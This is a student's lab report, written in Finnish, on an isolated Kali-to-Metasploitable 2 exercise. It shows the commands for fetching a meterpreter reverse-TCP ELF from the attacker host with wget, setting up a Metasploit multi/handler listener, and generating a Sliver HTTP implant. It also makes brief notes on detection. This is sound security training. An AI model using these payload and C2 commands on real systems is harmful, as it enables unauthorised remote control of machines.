# H6 Koita simpukoita | Nathaniel Ssendagire 28.04.2026
## Ympäristö
### OS: Kali Linux

### Browser: Firefox 128.3.1esr (64-bit)

### Hardware Model: VMWare Workstation Pro Memory: 4.0 GB

### Processor: AMD Ryzen 3 7320U - 4 cores used

### Disk: 35 GB

### Network: NAT / Host-Only

## A) Venom

<img width="738" height="237" alt="msfvenom activation" src="https://github.com/user-attachments/assets/4d272090-93ba-4797-b96d-908388ac615b" />

Generoin 32-bittisen Linux-binäärin (`elf`), joka sisältää meterpreter-payloadin. Käytin hyökkääjän IP-osoitteena (`192.168.18.129`) ja porttina (`4444`).

<img width="520" height="75" alt="setup a webserver" src="https://github.com/user-attachments/assets/0857d480-6d80-487a-8269-df9b4a05e28b" />

Käynnistin Kalissa Python-pohjaisen HTTP-palvelimen, jotta voin ladata tiedoston kohdekoneelle (Metasploitable 2).

<img width="647" height="107" alt="webserver got something" src="https://github.com/user-attachments/assets/219bcaa3-6fd1-477d-95ee-70ec182e90a6" />

<img width="723" height="191" alt="got the file" src="https://github.com/user-attachments/assets/4576fee6-5359-4411-bc7d-68dccc7942c3" />

<img width="535" height="58" alt="executed the file" src="https://github.com/user-attachments/assets/4534fc6f-11c4-4835-871a-ca6c35864c5e" />


Kohteessa latasin tiedoston wget-komennolla ja annoin sille suoritusoikeudet:

```
msfadmin@metasploitable:~$ wget http://192.168.18.129:8000/shell.elf
msfadmin@metasploitable:~$ chmod +x shell.elf
```

## B) Snif venom!
<img width="675" height="402" alt="msfconsole reverse tcp" src="https://github.com/user-attachments/assets/63a65330-424c-42e3-b0b2-8f47248788e7" />


Ennen tiedoston suorittamista, valmistelin Metasploit Frameworkin (msfconsole) ottamaan yhteyden vastaan käyttämällä multi/handler-moduulia.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.18.129
msf6 exploit(multi/handler) > exploit
```

<img width="535" height="58" alt="executed the file" src="https://github.com/user-attachments/assets/f469b261-6498-466d-9a57-fcd5f59c0ae5" />

Suoritin tiedoston Metasploitablesta käsin (./haittaohjelma_32.elf), jolloin Kalin terminaaliin aukesi aktiivinen Meterpreter-sessio. Tämä vahvisti, että hyökkääjällä on nyt täysi hallinta kohdekoneeseen.

<img width="758" height="647" alt="wireshark tcp packets" src="https://github.com/user-attachments/assets/4fdbcf1e-c092-42b6-af80-c350972ec62d" />

Tämä perinteinen tapa luoda yhteys on tehokas, mutta verkkotasolla se on "äänekäs". Se luo yhden jatkuvan TCP-putken, joka on helppo havaita, jos verkonvalvonta etsii pitkäkestoisia ja epätavallisia yhteyksiä porttiin 4444

## C)  Hello, Sliver

<img width="678" height="186" alt="sliver installation" src="https://github.com/user-attachments/assets/0ce8140c-bdda-448f-8b1f-70048742a855" />

Sliver asennettiin Kali Linuxiin suoraan virallisista pakettivarastoista.

```
sudo apt update
sudo apt install sliver
```

<img width="640" height="393" alt="sliver startup" src="https://github.com/user-attachments/assets/abdd8b59-adb8-48bd-8a55-dbf27f02ae22" />

Asennuksen jälkeen Sliver-palvelin käynnistettiin komennolla (`sliver-server`).

<img width="327" height="218" alt="http sliver" src="https://github.com/user-attachments/assets/d51aae5a-ac58-4b6f-a408-3e7ef9ad481b" />

Sliverissä käynnistettiin HTTP-palvelin porttiin 80. Portin 80 varaaminen vaati muiden palveluiden (kuten Apache) sammuttamista.

```
sliver > http
```

<img width="692" height="80" alt="too old" src="https://github.com/user-attachments/assets/a15a521b-c1ce-4629-a554-6891e0f5ef9f" />

<img width="223" height="142" alt="nada " src="https://github.com/user-attachments/assets/82b956ae-e12d-4cf6-9050-bd618e4eef8e" />

<img width="646" height="171" alt="sliver file creation" src="https://github.com/user-attachments/assets/4cab8a22-f363-4c80-87b3-b09126a32b7b" />



Tehtävässä havaittiin yhteensopivuusongelma: modernit Go-kielellä käännetyt Sliver-implantit vaativat Linux-kernelin version 2.6.32 tai uudemman. Koska Metasploitable 2:n kernel on ikivanha (2.6.24), implantti kaatui kohteessa välittömästi (ChatGPT). Raportointia ja analyysia varten implantti generoitiin ja suoritettiin paikallisesti Kalilla:

```
generate --http 192.168.18.129 --os linux --arch amd64 --save ./sliver_http.elf
```

